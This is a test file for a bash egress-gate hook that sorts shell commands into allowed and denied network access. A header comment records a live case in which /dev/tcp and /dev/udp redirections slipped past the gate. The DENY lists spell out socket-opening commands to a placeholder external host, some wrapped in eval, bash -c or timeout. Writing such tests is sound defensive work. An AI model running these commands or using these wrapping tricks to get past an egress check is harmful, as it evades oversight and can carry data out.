import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

// f3667105 (2026-10-16): bash's built-in network pseudo-devices (/dev/tcp, /dev/udp) open a socket when used as a
// REDIRECTION target -- `exec 3<>/dev/tcp/host/port`, `cat </dev/tcp/host/port`, `echo >/dev/udp/host/port`. The gate
// read command words and the named clients (nc, socat, ...) but never a redirect target, so a plain TCP connect to an
// external host went through (a finding measured live 2026-10-16 04:34Z; the exact live form is not reproduced
// here). The host is the third path segment, judged like a client's destination: external denies, local/private passes,
// and a host that is not a plain literal (a variable not resolvable in this command, a substitution, a glob, empty) or
// an unbounded/non-static loop source fails closed (the a9c7bee0 rule, which the lead's brief names for this card). The
// pre-fix base (15b01baf) is the negative control: it allows every DENY case. Run this file there to see it red.
const EXT = 'pelda-f3667105.invalid'

describe('a bash /dev/tcp or /dev/udp redirect target is a network destination', () => {
  const DENY: Array<[string, string]> = [
    // read-write socket, the classic connect form
    [`exec 3<>/dev/tcp/${EXT}/443`, EXT],
    // write side only
    [`echo "GET / HTTP/1.0" >/dev/tcp/${EXT}/80`, EXT],
    // read side only
    [`cat </dev/tcp/${EXT}/443`, EXT],
    // udp
    [`echo x >/dev/udp/${EXT}/53`, EXT],
    // a space between the operator and the target
    [`exec 5<> /dev/tcp/${EXT}/8443`, EXT],
    // the host assigned an external value in the SAME command resolves to external
    [`H=${EXT}; exec 3<>/dev/tcp/$H/443`, EXT],
    // a bounded loop, external value among the hosts (loop variants are enumerated)
    [`for h in ${EXT} localhost; do cat </dev/tcp/$h/443; done`, EXT],
    // a fixed external host inside a loop body
    [`for i in 1 2 3; do exec 3<>/dev/tcp/${EXT}/443; done`, EXT],
    // wrapped in a shell -c string (recurses into classify)
    [`bash -c 'exec 3<>/dev/tcp/${EXT}/443'`, EXT],
    // wrapped in eval
    [`eval "exec 3<>/dev/tcp/${EXT}/443"`, EXT],
    // wrapped behind a launcher (timeout) and a shell -c
    [`timeout 2 bash -c "echo >/dev/tcp/${EXT}/22"`, EXT],
    // the word-form `>&`/`N>&`/`<&`: when the word is a path (not a digit), bash opens it, so a socket opens too
    [`echo x >&/dev/tcp/${EXT}/80`, EXT],
    [`exec 3>&/dev/tcp/${EXT}/443`, EXT],
    [`cat 4<&/dev/tcp/${EXT}/22`, EXT],
  ]
  // host not statically decidable -> fail closed, and NO bogus host is reported
  const DENY_NONLITERAL = [
    // a variable that is not assigned in this command
    `exec 3<>/dev/tcp/$TARGET/443`,
    // host from a command substitution
    `exec 3<>/dev/tcp/$(cat h.txt)/443`,
    // the loop source is a command substitution -> values are not static
    `for h in $(cat hosts.txt); do exec 3<>/dev/tcp/$h/443; done`,
  ]
  const ALLOW = [
    // loopback and private network pass, as for every other client
    `exec 3<>/dev/tcp/localhost/3420`,
    `cat </dev/tcp/127.0.0.1/11434`,
    `exec 3<>/dev/tcp/nas.local/445`,
    // a bounded loop whose hosts are all local
    `for h in 127.0.0.1 localhost; do exec 3<>/dev/tcp/$h/443; done`,
    // the host assigned a local value in the same command resolves to local
    `H=127.0.0.1; exec 3<>/dev/tcp/$H/3420`,
    // the string merely appears as data in a quoted argument, not as a redirect target
    `echo "open /dev/tcp/${EXT}/443 to connect"`,
    // an operator+path that sits INSIDE quotes is inert text, not a redirect (structure comes from the masked span)
    `echo ">/dev/tcp/${EXT}/443"`,
    `printf "%s" "exec 3<>/dev/tcp/${EXT}/443"`,
    // a comment mentioning it is not a redirect
    `ls /tmp # /dev/tcp/${EXT}/443`,
    // a plain filename ARGUMENT, not a redirect target: bash's /dev/tcp magic applies only to redirections
    `cat /dev/tcp/${EXT}/443`,
    // `>&`/`N>&` with a DIGIT word is fd duplication, not a path: not a /dev/tcp redirect
    `echo hi >&2`,
    `exec 3>&1`,
    // `>&` to a local pseudo-device is not external
    `ls >&/dev/null`,
  ]
  it('denies a redirect to an external /dev/tcp or /dev/udp target, however it is wrapped', () => {
    for (const [cmd, host] of DENY) expect({ cmd, r: classify(cmd) }).toMatchObject({ cmd, r: { deny: true, hosts: [host] } })
  })
  it('fails closed when the redirect host is not a plain literal, with no bogus host reported', () => {
    for (const cmd of DENY_NONLITERAL) expect({ cmd, r: classify(cmd) }).toMatchObject({ cmd, r: { deny: true, hosts: [] } })
  })
  it('CONTROLS: loopback, private network, a local loop, a locally-assigned host, and the string as data all pass', () => {
    for (const cmd of ALLOW) expect({ cmd, deny: classify(cmd).deny }).toEqual({ cmd, deny: false })
  })
})
